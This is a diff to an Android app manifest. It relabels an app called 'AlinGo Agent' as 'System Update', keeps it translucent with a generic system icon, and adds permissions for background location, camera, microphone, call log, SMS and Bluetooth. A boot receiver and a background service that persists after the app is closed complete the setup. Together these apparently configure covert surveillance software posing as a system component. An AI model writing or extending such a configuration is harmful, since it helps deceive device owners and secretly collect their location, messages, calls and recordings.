@@ -1,20 +1,72 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- NETWORK                                                       -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- FOREGROUND SERVICE                                            -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- BLUETOOTH (New — HID + RFCOMM)                                -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <uses-permission android:name="android.permission.BLUETOOTH"
+        android:maxSdkVersion="30" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"
+        android:maxSdkVersion="30" />
+    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
+    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADVERTISE" />
+
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- LOCATION                                                      -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- CAMERA + MIC                                                  -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
+
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- CALLS + SMS                                                   -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- STORAGE (for file operations, Android 12 and below)           -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="28" />
+
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- APPLICATION                                                   -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
     <application
         android:allowBackup="false"
         android:icon="@android:drawable/ic_menu_manage"
-        android:label="AlinGo Agent"
+        android:label="System Update"
         android:theme="@android:style/Theme.Translucent.NoTitleBar">
 
+        <!-- Setup Activity (Entry Point) -->
         <activity
             android:name=".SetupActivity"
             android:exported="true"
@@ -32,12 +84,14 @@
             </intent-filter>
         </activity>
 
+        <!-- Agent Service (Background) -->
         <service
             android:name=".AgentService"
             android:exported="false"
             android:foregroundServiceType="dataSync"
             android:stopWithTask="false" />
 
+        <!-- Boot Receiver -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -46,5 +100,6 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
+
     </application>
 </manifest>
